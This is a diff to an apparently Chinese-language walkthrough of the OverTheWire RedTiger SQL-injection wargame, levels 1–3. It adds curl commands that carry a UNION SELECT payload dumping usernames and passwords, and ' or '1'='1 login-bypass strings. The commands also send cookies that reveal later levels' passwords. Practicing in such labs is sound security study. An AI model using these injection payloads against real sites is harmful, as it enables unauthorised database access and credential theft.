@@ -575,8 +575,15 @@ https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username
 ```
 got it.拿到用户名密码后登录即可。
 
+```
+curl "http://redtiger.labs.overthewire.org/level1.php?cat=1"%"20union"%"20select"%"201,2,username,password"%"20from"%"20level1_users" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" --compressed -H "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" -H "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "Host: redtiger.labs.overthewire.org" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --data ""
+```
+
 ## level2
 
+```
+curl "http://redtiger.labs.overthewire.org/level2.php"-H "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --data ""
+```
 首先点击登陆按钮，抓取登陆数据包。有如下字段
 	
 	username=admin&password=admin&login=Login
@@ -603,8 +610,16 @@ admin')or('1'='1
 ' or '1'='1
 ```
 
+```
+curl "http://redtiger.labs.overthewire.org/level2.php" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug"  --data "username=1&password='+or+'1'='1&login=Login"
+```
 
 ## level3
+
+```
+curl "http://redtiger.labs.overthewire.org/level3.php" -H "Host: redtiger.labs.overthewire.org" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --compressed -H "Referer: http://redtiger.labs.overthewire.org/level2.php" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" --data  "password=feed_your_cat_before_your_cat_feeds_you&level3login=Hack+it"
+```
+
 
 ```
 Admin'
